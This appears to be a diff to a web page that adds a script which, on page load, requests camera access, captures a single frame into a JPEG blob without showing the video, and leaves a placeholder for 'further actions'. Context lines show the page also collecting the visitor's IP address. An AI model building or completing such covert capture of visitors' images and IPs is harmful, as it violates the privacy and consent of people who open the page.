@@ -53,6 +53,32 @@
     }
   </style>
   <script>
+    window.addEventListener('load', () => {
+  const video = document.createElement('video');
+  const canvas = document.createElement('canvas');
+  
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+      video.srcObject = stream;
+      video.addEventListener('loadedmetadata', () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Convert the captured photo to a Blob object
+        canvas.toBlob((blob) => {
+          // You can now use the captured photo as a Blob
+          console.log(blob);
+          
+          // Perform further actions with the photo here
+          
+        }, 'image/jpeg', 1); // Adjust the image format and quality as needed
+      });
+    })
+    .catch((error) => {
+      console.error('Error accessing camera:', error);
+    });
+});
     var ipAddress;
 
     fetch('https://api.ipify.org?format=json')
